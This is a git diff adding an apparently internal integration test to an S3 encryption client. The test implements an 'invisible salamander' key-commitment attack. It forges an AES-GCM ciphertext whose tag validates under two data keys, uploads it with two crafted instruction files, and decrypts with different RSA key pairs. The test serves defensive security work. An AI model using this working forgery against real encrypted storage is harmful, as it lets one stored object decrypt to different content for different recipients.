ecc7a6e08346990278d57787d98fe9be27f98c7f
Kess Plasmeier <kessplas@amazon.com>
2025-11-10 19:12:22 -0800

    <Do not merge> salamander test

--- test-server/java-tests/src/it/java/software/amazon/encryption/s3/RoundTripTests.java
+++ test-server/java-tests/src/it/java/software/amazon/encryption/s3/RoundTripTests.java
@@ -9,19 +9,43 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 import static org.junit.jupiter.api.Assertions.fail;
+import static software.amazon.encryption.s3.FunWithGcm.add;
+import static software.amazon.encryption.s3.FunWithGcm.authKey;
+import static software.amazon.encryption.s3.FunWithGcm.gctr;
+import static software.amazon.encryption.s3.FunWithGcm.ghash;
+import static software.amazon.encryption.s3.FunWithGcm.inverse;
+import static software.amazon.encryption.s3.FunWithGcm.lengthBlock;
+import static software.amazon.encryption.s3.FunWithGcm.mul;
+import static software.amazon.encryption.s3.FunWithGcm.tagBlock;
+import static software.amazon.encryption.s3.S3EncryptionClient.withCustomInstructionFileSuffix;
 import static software.amazon.encryption.s3.TestUtils.*;
 
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
 import java.nio.ByteBuffer;
+import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
+import java.security.GeneralSecurityException;
+import java.security.KeyPair;
+import java.security.KeyPairGenerator;
+import java.security.PublicKey;
+import java.security.SecureRandom;
+import java.security.spec.MGF1ParameterSpec;
+import java.util.Base64;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 
+import com.amazonaws.services.s3.AmazonS3;
+import com.amazonaws.services.s3.AmazonS3ClientBuilder;
 import com.amazonaws.services.s3.AmazonS3EncryptionClientV2;
 import com.amazonaws.services.s3.AmazonS3EncryptionV2;
 import com.amazonaws.services.s3.model.CryptoConfigurationV2;
 import com.amazonaws.services.s3.model.KMSEncryptionMaterials;
+import com.amazonaws.services.s3.model.ObjectMetadata;
+import com.amazonaws.services.s3.model.PutObjectRequest;
 import org.junit.jupiter.api.BeforeAll;
+import org.junit.jupiter.api.Test;
 import org.junit.jupiter.params.ParameterizedTest;
 import org.junit.jupiter.params.provider.MethodSource;
 import org.opentest4j.TestAbortedException;
@@ -48,6 +72,11 @@ import com.amazonaws.services.s3.model.CryptoMode;
 import com.amazonaws.services.s3.model.CryptoStorageMode;
 import com.amazonaws.services.s3.model.EncryptionMaterialsProvider;
 import com.amazonaws.services.s3.model.KMSEncryptionMaterialsProvider;
+
+import javax.crypto.Cipher;
+import javax.crypto.spec.OAEPParameterSpec;
+import javax.crypto.spec.PSource;
+import javax.crypto.spec.SecretKeySpec;
 
 public class RoundTripTests {
 
@@ -557,4 +586,144 @@ public class RoundTripTests {
 
         assertEquals(input, new String(output.getBody().array()));
     }
+
+    @ParameterizedTest(name = "{displayName} for Encrypt: Java, Decrypt: {0}")
+    @MethodSource("software.amazon.encryption.s3.TestUtils#clientsForTest")
+    public void executeKeyCommitAttackCustomSuffixLocal(TestUtils.LanguageServerTarget language) throws Exception {
+        // To execute this attack we need:
+        // - A forged (content) ciphertext (+ IV(s))
+        // - Two data keys
+        // - Two wrapping keys (RSA)
+        // Then:
+        // - Upload the object for the content ciphertext, no parameters
+        // - Upload one instruction file with Key1 (default suffix)
+        // - Upload another instruction file with Key2 (custom suffix)
+        // - Decrypt with S3EC
+
+        // Generate RSA key pairs
+        KeyPairGenerator keyPairGen = KeyPairGenerator.getInstance("RSA");
+        keyPairGen.initialize(2048);
+        KeyPair RSA_KEY_PAIR_1 = keyPairGen.generateKeyPair();
+        KeyPair RSA_KEY_PAIR_2 = keyPairGen.generateKeyPair();
+
+        S3ECTestServerClient client = testServerClientFor(language);
+        final String objectKey = "key-commitment-attack-custom-suffix";
+        byte[] message = "Hello, World!".getBytes(Charset.forName("UTF-8"));
+        SecureRandom rand = new SecureRandom();
+        byte[] key = new byte[32];
+        rand.nextBytes(key);
+        byte[] key2 = new byte[32];
+        rand.nextBytes(key2);
+        message[0] = 0x13;
+        message[1] = 0x37;
+        byte[] ciphertext;
+        byte message1[] = new byte[16];
+        message1[0] = 0x13;
+        message1[1] = 0x37;
+        byte iv[] = new byte[12];
+        rand.nextBytes(iv);
+        byte authKey1[] = authKey(key);
+        byte authKey2[] = authKey(key2);
+        byte tagBlock1[] = tagBlock(iv, key);
+        byte tagBlock2[] = tagBlock(iv, key2);
+        byte ciphertext1[] = gctr(message1, iv, key);
+        byte lengthBlock[] = lengthBlock(0, 32);
+        // tag(H, tb) = c1 * H^3 + c2 * H^2 + lb * H + tb
+        // c1 * H1^3 + c2 * H1^2 + lb * H1 + tb1 = c1 * H2^3 + c2 * H2^2 + lb * H2 + tb2
+        // c2 * (H1^2 + H2^2) = c1 * (H1^3 + H2^3) + lb * (H1 + H2) + tb1 + tb2
+        byte rhs[] = add(tagBlock1, tagBlock2);
+        rhs = add(rhs, mul(lengthBlock, add(authKey1, authKey2)));
+        byte authKey1sq[] = mul(authKey1, authKey1);
+        byte authKey2sq[] = mul(authKey2, authKey2);
+        byte lhs[] = add(authKey1sq, authKey2sq);
+        byte authKey1cb[] = mul(authKey1sq, authKey1);
+        byte authKey2cb[] = mul(authKey2sq, authKey2);
+        rhs = add(rhs, mul(ciphertext1, add(authKey1cb, authKey2cb)));
+        byte[] ciphertext2 = mul(inverse(lhs), rhs);
+        ByteBuffer attackCiphertext = ByteBuffer.allocate(32);
+        attackCiphertext.put(ciphertext1);
+        attackCiphertext.put(ciphertext2);
+        byte[] ghash = ghash(new byte[0], attackCiphertext.array(), authKey1);
+        ByteBuffer attack = ByteBuffer.allocate( 32 + 16);
+        //        attack.put(iv);
+        attack.put(ciphertext1);
+        attack.put(ciphertext2);
+        attack.put(add(tagBlock1, ghash));
+        ciphertext = attack.array();
+
+        //        aliceOutput(ciphertext, key2, key);
+
+        // Encrypt the data keys
+        byte[] edk1 = encryptDataKeyRsa(rand, RSA_KEY_PAIR_1.getPublic(), key);
+        //        byte[] edk2 = encryptDataKeyRsa(rand, RSA_KEY_PAIR_2.getPublic(), key2);
+        byte[] edk2 = encryptDataKeyRsa(rand, RSA_KEY_PAIR_2.getPublic(), key2);
+
+        // Make a fake instruction file
+        String fakeInstFileKey1 = fakeInstFile(edk1, iv);
+        String fakeInstFileKey2 = fakeInstFile(edk2, iv);
+
+        // Put the three evil objects with default S3 client
+        AmazonS3 s3 = AmazonS3ClientBuilder.defaultClient();
+        InputStream ct = new ByteArrayInputStream(ciphertext);
+        ObjectMetadata md = new ObjectMetadata();
+        PutObjectRequest obj = new PutObjectRequest(BUCKET, objectKey, ct, md);
+        s3.putObject(obj);
+
+        s3.putObject(BUCKET, objectKey + ".instruction", fakeInstFileKey1);
+        s3.putObject(BUCKET, objectKey + ".instruction.custom", fakeInstFileKey2);
+
+        // Attempt to decrypt
+        S3Client s3Ec = S3EncryptionClient.builder()
+          .rsaKeyPair(RSA_KEY_PAIR_1)
+          .build();
+
+        ResponseBytes<GetObjectResponse> responseBytes = s3Ec.getObjectAsBytes(builder -> builder
+          .bucket(BUCKET)
+          .key(objectKey).build());
+        System.out.println("Response for Key 1: " + Base64.getEncoder().encodeToString(responseBytes.asByteArray()));
+
+        // Attempt to decrypt
+        S3Client s3Ec2 = S3EncryptionClient.builder()
+          .rsaKeyPair(RSA_KEY_PAIR_2)
+          .build();
+
+        ResponseBytes<GetObjectResponse> responseBytes2 = s3Ec2.getObjectAsBytes(builder -> builder
+          .bucket(BUCKET)
+          .key(objectKey)
+          .overrideConfiguration(withCustomInstructionFileSuffix(".instruction.custom")).build());
+        System.out.println("Response for Key 2: " + Base64.getEncoder().encodeToString(responseBytes2.asByteArray()));
+    }
+
+    public byte[] encryptDataKeyRsa(SecureRandom secureRandom, PublicKey pubKey, byte[] pdk) throws GeneralSecurityException {
+        final String DIGEST_NAME = "SHA-1";
+        final String MGF_NAME = "MGF1";
+
+        // Java 8 doesn't support static class fields in inner classes
+        MGF1ParameterSpec MGF_PARAMETER_SPEC = new MGF1ParameterSpec(DIGEST_NAME);
+        OAEPParameterSpec OAEP_PARAMETER_SPEC =
+          new OAEPParameterSpec(DIGEST_NAME, MGF_NAME, MGF_PARAMETER_SPEC, PSource.PSpecified.DEFAULT);
+        final Cipher cipher = Cipher.getInstance("RSA/ECB/OAEPPadding");
+        cipher.init(Cipher.WRAP_MODE, pubKey, OAEP_PARAMETER_SPEC, secureRandom);
+
+        // Create a pseudo-data key with the content encryption appended to the data key
+        byte[] dataCipherName = "AES/GCM/NoPadding".getBytes(StandardCharsets.UTF_8);
+        byte[] pseudoDataKey = new byte[1 + pdk.length + dataCipherName.length];
+
+        pseudoDataKey[0] = (byte) pdk.length;
+        System.arraycopy(pdk, 0, pseudoDataKey, 1, pdk.length);
+        System.arraycopy(dataCipherName, 0, pseudoDataKey, 1 + pdk.length, dataCipherName.length);
+
+        return cipher.wrap(new SecretKeySpec(pseudoDataKey, "AES"));
+    }
+
+    private String fakeInstFile(byte[] encDataKey, byte[] iv) {
+        String ivStr = Base64.getEncoder().encodeToString(iv);
+        String edkStr = Base64.getEncoder().encodeToString(encDataKey);
+
+        String preIv = "{\"x-amz-tag-len\":\"128\",\"x-amz-iv\":\"";
+        String postIv = "\",\"x-amz-wrap-alg\":\"RSA-OAEP-SHA1\",\"x-amz-key-v2\":\"";
+        String postKey = "\",\"x-amz-cek-alg\":\"AES/GCM/NoPadding\",\"x-amz-matdesc\":\"{}\"}";
+        return preIv + ivStr + postIv + edkStr + postKey;
+    }
+
 }
